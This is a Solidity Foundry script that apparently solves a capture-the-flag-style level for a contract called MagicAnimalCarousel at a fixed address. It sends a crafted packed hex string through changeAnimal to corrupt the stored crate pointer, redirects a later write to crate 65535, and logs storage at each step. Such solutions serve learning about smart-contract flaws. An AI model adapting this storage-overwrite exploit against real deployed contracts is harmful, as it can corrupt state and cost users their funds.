// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../src/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselScript is Script {
    MagicAnimalCarousel carousel;

    function run() external {
        vm.startBroadcast();
        carousel = MagicAnimalCarousel(0x2cd1638a3cb327B8cF957D5B985d6eA6CdC79FE0);

        // Step 1: Add animal to first crate
        carousel.setAnimalAndSpin("Dog");

        console.log("Animal at crate 1 after setting Dog: ");
        console.logBytes32(bytes32(carousel.carousel(1)));
        console.log("Current crate ID: ", carousel.currentCrateId());

        // Step 2: Manipulate nextCrateId
        string memory exploitString = string(abi.encodePacked(hex"10000000000000000000FFFF"));
        carousel.changeAnimal(exploitString, 1);

        console.log("Animal at crate 1 after manipulating:");
        console.logBytes32(bytes32(carousel.carousel(1)));
        console.log("Current crate ID: ", carousel.currentCrateId());

        // Step 3: Add animal to 65535th crate
        carousel.setAnimalAndSpin("Parrot");

        console.log("Animal at crate 1 after setting Parrot:");
        console.logBytes32(bytes32(carousel.carousel(1)));
        console.log("Animal at crate 65535 after setting Parrot:");
        console.logBytes32(bytes32(carousel.carousel(65535)));
        console.log("Current crate ID: ", carousel.currentCrateId());

        vm.stopBroadcast();
    }
}